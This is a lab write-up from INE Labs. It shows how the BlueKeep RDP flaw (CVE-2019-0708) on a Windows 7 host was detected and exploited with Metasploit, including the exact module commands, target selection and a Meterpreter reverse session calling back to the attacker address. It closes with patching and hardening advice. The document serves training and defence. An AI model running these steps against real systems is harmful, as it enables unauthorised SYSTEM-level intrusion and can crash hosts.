---
title: "BlueKeep (CVE-2019-0708)"
description: "Detecting and exploiting the BlueKeep RDP vulnerability (CVE-2019-0708) with Metasploit to obtain a SYSTEM Meterpreter session on a Windows 7 host."
date: 2025-10-27
platform: "INE Labs"
difficulty: "Medium"
tags: ["BlueKeep", "RDP", "CVE-2019-0708", "Metasploit", "Windows"]
cover: "./photo1.png"
---

# BlueKeep (CVE-2019-0708)

**Classification:** Assessment Methodologies / Vulnerability Assessment<br>
**Target:** 10.10.10.7 (WIN7-PC - Windows 7 SP1 x64)<br>
**Attacker:** 10.10.10.10

## 1. Executive Summary

The target exposes the **RDP** service (port 3389), which is vulnerable to **BlueKeep
(CVE-2019-0708)**, a pre-authentication remote code execution flaw in the Windows RDP
kernel driver. Using Metasploit we confirm the vulnerability with the scanner module and
then exploit it to obtain a Meterpreter session running as **NT AUTHORITY\SYSTEM**.

## 2. Reconnaissance

We confirm the RDP service is running on the target.

```bash
sudo nmap -p 3389 10.10.10.7
```

Port `3389/tcp` (ms-wbt-server) is open.

![Nmap scan of RDP port](./photo1.png)

## 3. Vulnerability Check

In MSF Console we search for BlueKeep modules and select the scanner.

```bash
search BlueKeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

![Searching BlueKeep modules](./photo2.png)

After setting `RHOSTS` to the target, we run the check.

```bash
set RHOSTS 10.10.10.7
run
```

The module reports the target is **vulnerable** (it attempted cleanup of the
incorrectly-bound MS_T120 channel).

![Scanner confirms the target is vulnerable](./photo3.png)

## 4. Exploitation

We switch to the exploit module (which only works on x64 Windows) and review the payload
options (`LHOST` = our host, `LPORT` = listener port).

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 10.10.10.7
set LHOST 10.10.10.10
```

![Payload options for the exploit](./photo4.png)

Running it with automatic targeting fails, as the module cannot fingerprint the exact
environment and asks us to set the target manually.

```bash
exploit
```

![Exploit aborted - target must be set manually](./photo5.png)

We list the available targets and select the one matching the environment (VirtualBox).

```bash
show targets
set target 2
```

![Selecting the correct exploit target](./photo6.png)

Running the exploit again, the CHUNK grooming strategy succeeds and a Meterpreter session
is opened.

```bash
exploit
```

> Note: because BlueKeep corrupts kernel memory, an incorrect target or grooming size can
> crash the host (BSOD). If that happens, adjust the target/grooming parameters and retry.

![Successful exploitation - Meterpreter session](./photo7.png)

## 5. Post-Exploitation

```bash
sysinfo
getuid
```

We confirm access to `WIN7-PC` (Windows 7 SP1 x64) as **NT AUTHORITY\SYSTEM**.

![sysinfo and getuid - SYSTEM access](./photo8.png)

## 6. Remediation Recommendations

1. **Apply the Microsoft patch for CVE-2019-0708** (May 2019) on all affected systems
   (Windows 7, Server 2008/2008 R2 and earlier).
2. **Enable Network Level Authentication (NLA)** for RDP, which requires authentication
   before a session is established and mitigates BlueKeep.
3. **Restrict RDP exposure:** do not expose 3389 to untrusted networks; place it behind a
   VPN and firewall, and disable RDP where it is not needed.
4. **Decommission end-of-life operating systems** that no longer receive security updates.
